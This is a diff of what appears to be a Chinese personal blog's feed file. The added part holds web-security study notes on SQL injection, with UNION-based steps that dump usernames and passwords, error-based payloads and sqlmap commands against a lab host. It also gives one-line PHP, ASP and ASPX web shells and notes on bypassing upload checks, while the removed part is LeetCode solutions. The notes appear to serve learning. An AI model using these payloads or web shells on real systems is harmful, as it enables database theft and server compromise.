+<h4 id="数字型">数字型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.and逻辑测试：</span><br><span class="line"></span><br><span class="line">and 1=1  sql语句： select name from users where id=1 and 1=1</span><br><span class="line">and 1=2  sql语句： select name from users where id=1 and 1=2</span><br><span class="line"></span><br><span class="line">通过比较页面的变化判断输入是否被带入数据库执行。</span><br><span class="line"></span><br><span class="line">2.单引号测试：</span><br><span class="line"></span><br><span class="line">sql语句： select name from users where id=1&#x27;</span><br><span class="line"></span><br><span class="line">构造sql语法错误，来判断输入是否被执行。</span><br></pre></td></tr></table></figure>
+<h4 id="字符型">字符型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;、id=1&quot;  构造sql语法错误，来判断输入是否被执行。</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="搜索型">搜索型</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL=&quot;select * from users where name like &#x27;%tom%&#x27;&quot;</span><br><span class="line"></span><br><span class="line">1 and 1=1</span><br><span class="line">SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;</span><br><span class="line">这个输入显然会报错误。</span><br><span class="line"></span><br><span class="line">1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1</span><br><span class="line">SQL查询语句：select * from users where name like &#x27;%1%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;</span><br><span class="line">这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。</span><br></pre></td></tr></table></figure>
+<h4 id="GET显错注入">GET显错注入</h4>
+<p>流程</p>
+<blockquote>
+<p>01、获取字段数    order by x<br>
+02、获取显示位    union select 1,2,3,4……<br>
+03、获取数据库信息        version()，user()，@@datadir<br>
+04、获取当前数据库        database()， schema()<br>
+05、获取所有数据库<br>
+06、获取数据库表<br>
+07、获取所有字段<br>
+08、获取数据</p>
+<ul>
+<li>确定数字、字符、搜索型</li>
+<li>注入点</li>
+<li>当前数据库长度</li>
+<li>遍历得当前数据库名称</li>
+<li>获取数据库表总数</li>
+<li>依次获取表的长度、名字</li>
+<li>获取列</li>
+<li>获取数据</li>
+</ul>
+</blockquote>
+<p>注入步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 判断：</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=-1&#x27; or 1=1 --+</span><br><span class="line"></span><br><span class="line"># order by语句判断字段数量：</span><br><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line"></span><br><span class="line"># 联合查询获取显示位：</span><br><span class="line">id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库：</span><br><span class="line">id=-1&#x27; union select 1,(select database()),3 --+</span><br><span class="line"></span><br><span class="line"># 获取所有数据库：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line"></span><br><span class="line"># 获取当前数据库表名：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取users表所有字段：</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段</span><br><span class="line">id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line"># 获取security.users表所有字段内容：</span><br><span class="line">id=-1&#x27; union select 1,username,password from users --+</span><br></pre></td></tr></table></figure>
+<h4 id="报错注入">报错注入</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+<h3 id="绕过">绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符可替换空格 /**/ # --</span><br><span class="line"></span><br><span class="line">内联注入</span><br><span class="line">/*!/*!*/</span><br><span class="line">/* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="工具使用">工具使用</h3>
+<ul>
+<li>sqlmap</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入sqlmap目录</span><br><span class="line"></span><br><span class="line"># 检测漏洞</span><br><span class="line">python sqlmap.py [url]</span><br><span class="line">python sqlmap.py -u http://mingy.lab/Less-1/?id=1</span><br><span class="line"></span><br><span class="line"># 获取当前用户</span><br><span class="line">python sqlmap.py -u [url] --current-user</span><br><span class="line"># 当前数据库</span><br><span class="line">python sqlmap.py -u [url] --current-db</span><br><span class="line"># 所有数据库名</span><br><span class="line">python sqlmap.py -u [url] --dbs</span><br><span class="line"># 数据库表名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] --tables</span><br><span class="line"># 列名</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] --columns</span><br><span class="line"># 字段值</span><br><span class="line">python sqlmap.py -u [url] -D [库名] -T [表名] -C [列名1],[列名2] --dump</span><br><span class="line"></span><br><span class="line"># post注入</span><br><span class="line">python sqlmap.py -r aa.txt</span><br><span class="line">python sqlmap.py -r aa.txt --current-db --tables</span><br><span class="line"></span><br><span class="line"># aa.txt内容示例如下：</span><br><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=123456</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">#请求方法（如 POST）|目标路径（如 /login.php）|Host 头和其他必要头部（如 Content-Type）|空一行后接 POST 数据（如 username=...&amp;password=...）</span><br></pre></td></tr></table></figure>
+<h2 id="文件上传">文件上传</h2>
+<h3 id="常见一句话木马">常见一句话木马</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php一句话木马： </span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">asp一句话木马： </span><br><span class="line">&lt;%eval request(&quot;value&quot;)%&gt;</span><br><span class="line">aspx一句话木马： </span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="绕过-2">绕过</h3>
+<ul>
+<li>绕过客户端检测/JS检测</li>
+</ul>
+<p>原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。</p>
+<p>方法：在本地浏览器客户端禁用]S即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现，利用burpsuite可以绕过一切客户端检测。</p>
+<ul>
+<li>绕过服务端检测</li>
 </ul>
 ]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
   </entry>
   <entry>
     <title>算法</title>
@@ -1123,556 +1674,5 @@ token 存储在服务器的数据库，通常是通过登录或者⼀个特定�
       <tags>
         <tag>测试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>leetcode</title>
-    <url>/2025/03/17/leetcode/</url>
-    <content><![CDATA[<h1>哈希</h1>
-<h2 id="1-两数之和">1.两数之和</h2>
-<p>快速查找需求</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums,<span class="type">int</span> target)</span></span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = hashtable.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it !=hashtable.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i,it-&gt;second&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> target-nums[i] <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [i,hashtable[target-nums[i]]]</span><br><span class="line">            hashtable[nums[i]] =i</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
-<h2 id="面试题-16-15-珠玑妙算">面试题 16.15 珠玑妙算</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">masterMind</span><span class="params">(string solution, string guess)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ri= <span class="number">0</span>,fr=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dic[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; char_to_index = &#123;&#123;<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="number">2</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="number">3</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">char</span> s=solution[i],g = guess[i];</span><br><span class="line">            <span class="keyword">if</span>(s==g)</span><br><span class="line">                ri++;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>]++;</span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">            fr+=<span class="built_in">min</span>(dic[i][<span class="number">0</span>],dic[i][<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> &#123;ri,fr&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 低效</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hash_sol,hash_gue = defaultdict(<span class="built_in">int</span>),defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        right,fr=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> solution[i]==guess[i]:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hash_gue[guess[i]]+=<span class="number">1</span></span><br><span class="line">                hash_sol[solution[i]]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> hash_gue:</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> hash_sol:</span><br><span class="line">                fr += <span class="built_in">min</span> (hash_sol[key],hash_gue[key])</span><br><span class="line">        <span class="keyword">return</span> [right,fr]</span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 初始化猜中次数和伪猜中次数</span></span><br><span class="line">        corr, err = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用列表代替字典，索引对应字符：</span></span><br><span class="line">        <span class="comment"># 0: &#x27;R&#x27;, 1: &#x27;Y&#x27;, 2: &#x27;G&#x27;, 3: &#x27;B&#x27;</span></span><br><span class="line">        <span class="comment"># dic[char][0]: solution 中未匹配的字符数量</span></span><br><span class="line">        <span class="comment"># dic[char][1]: guess 中未匹配的字符数量</span></span><br><span class="line">        dic = [[<span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 字符到索引的映射</span></span><br><span class="line">        char_to_index = &#123;<span class="string">&#x27;R&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;Y&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历字符串，统计猜中次数和未匹配字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s, g = solution[i], guess[i]</span><br><span class="line">            <span class="keyword">if</span> s == g:</span><br><span class="line">                corr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 更新 solution 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                <span class="comment"># 更新 guess 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算伪猜中次数</span></span><br><span class="line">        <span class="keyword">for</span> count_sol, count_gue <span class="keyword">in</span> dic:</span><br><span class="line">            err += <span class="built_in">min</span>(count_sol, count_gue)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [corr, err]</span><br></pre></td></tr></table></figure>
-<h2 id="1941-检查是否所有字符出现次数相同">1941 检查是否所有字符出现次数相同</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">areOccurrencesEqual</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span> ,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :s)</span><br><span class="line">            hashtable[c]++;</span><br><span class="line">        <span class="type">int</span> n = hashtable[s[<span class="number">0</span>]];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c :s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashtable[c]!=n)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        hashtable = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            hashtable[i]+=<span class="number">1</span></span><br><span class="line">        n = hashtable[s[<span class="number">0</span>]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashtable:</span><br><span class="line">            <span class="keyword">if</span> n!=hashtable[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        c = Counter(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">set</span>(c.values())) == <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h2 id="13-罗马数字转整数">13 罗马数字转整数</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map &lt;<span class="type">char</span>,<span class="type">int</span>&gt; dic = &#123;&#123;<span class="string">&#x27;I&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="number">5</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="number">50</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="number">100</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="number">500</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="number">1000</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        // 使用数组代替 unordered_map更快</span></span><br><span class="line"><span class="comment">        int dic[256] = &#123;0&#125;; // ASCII 表大小为 256</span></span><br><span class="line"><span class="comment">        dic[&#x27;I&#x27;] = 1;</span></span><br><span class="line"><span class="comment">        dic[&#x27;V&#x27;] = 5;</span></span><br><span class="line"><span class="comment">        dic[&#x27;X&#x27;] = 10;</span></span><br><span class="line"><span class="comment">        dic[&#x27;L&#x27;] = 50;</span></span><br><span class="line"><span class="comment">        dic[&#x27;C&#x27;] = 100;</span></span><br><span class="line"><span class="comment">        dic[&#x27;D&#x27;] = 500;</span></span><br><span class="line"><span class="comment">        dic[&#x27;M&#x27;] = 1000;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=s.<span class="built_in">length</span>()<span class="number">-1</span> &amp;&amp; dic[s[i]]&lt;dic[s[i<span class="number">+1</span>]])</span><br><span class="line">                result-=dic[s[i]];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result+=dic[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dic = &#123;<span class="string">&quot;I&quot;</span>:<span class="number">1</span>,<span class="string">&quot;V&quot;</span>:<span class="number">5</span>,<span class="string">&quot;X&quot;</span>:<span class="number">10</span>,<span class="string">&quot;L&quot;</span>:<span class="number">50</span>,<span class="string">&quot;C&quot;</span>:<span class="number">100</span>,<span class="string">&quot;D&quot;</span>:<span class="number">500</span>,<span class="string">&quot;M&quot;</span>:<span class="number">1000</span>&#125;</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> i !=<span class="built_in">len</span>(s)-<span class="number">1</span> <span class="keyword">and</span> dic[s[i]] &lt; dic[s[i+<span class="number">1</span>]]  :</span><br><span class="line">                result -= dic[s[i]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += dic[s[i]]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
-<h2 id="3-无重复字符的最长子串">3.无重复字符的最长子串</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; set;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>(),r=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>;l&lt;n;l++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l!=<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">erase</span>(s[l<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(r&lt;n &amp;&amp; set.<span class="built_in">count</span>(s[r])==<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(s[r]);</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,r-l);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        occ = <span class="built_in">set</span>()</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        r,ans=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> l != <span class="number">0</span>:</span><br><span class="line">                occ.remove(s[l-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">while</span> r&lt;n <span class="keyword">and</span> s[r] <span class="keyword">not</span> <span class="keyword">in</span> occ:</span><br><span class="line">                occ.add(s[r])</span><br><span class="line">                r+=<span class="number">1</span></span><br><span class="line">            ans = <span class="built_in">max</span> (ans,r-l)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
-<h1>动态规划</h1>
-<h2 id="5-最长回文子串">5.最长回文子串</h2>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string result = <span class="string">&quot;&quot;</span>,odd,even;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            odd = <span class="built_in">expand</span>(s,i,i);</span><br><span class="line">            even = <span class="built_in">expand</span>(s,i,i<span class="number">+1</span>);</span><br><span class="line">            <span class="keyword">if</span>(odd.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = odd;</span><br><span class="line">            <span class="keyword">if</span>(even.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = even;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">expand</span><span class="params">(string s,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;s.<span class="built_in">length</span>() &amp;&amp; s[l]==s[r])&#123;</span><br><span class="line">            l--,r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(l<span class="number">+1</span>,r-l<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        </span><br><span class="line">        dp = [[<span class="literal">False</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]  <span class="comment"># 初始化 dp 数组</span></span><br><span class="line">        start, end = <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 记录最长回文子串的起始和结束位置</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 单个字符一定是回文</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            dp[i][i] = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度为 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i] == s[i + <span class="number">1</span>]:</span><br><span class="line">                dp[i][i + <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">                start, end = i, i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度大于 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):  <span class="comment"># 子串长度从 3 到 n</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - length + <span class="number">1</span>):  <span class="comment"># 子串起始位置</span></span><br><span class="line"> 